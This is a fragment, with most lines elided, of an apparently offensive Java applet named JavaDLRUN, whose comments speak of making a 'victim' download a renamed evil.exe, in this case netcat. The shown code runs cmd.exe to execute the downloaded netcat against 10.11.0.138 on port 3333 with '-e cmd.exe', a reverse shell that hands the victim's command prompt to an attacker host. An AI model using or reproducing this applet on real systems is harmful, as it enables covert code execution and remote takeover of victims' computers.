...
//Modify
//Line 25: Rename evil.exe to whatever you want the victim to download (in this case nc)
//Line 53: execution

public class JavaDLRUN extends Applet {
  ...
  public void init() {
    ...
    try {
      ...
      if (download.length() > 0) {
        ...
        f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.138 3333 -e cmd.exe");
      }
    } catch(IOException e) {
      e.printStackTrace();
    }
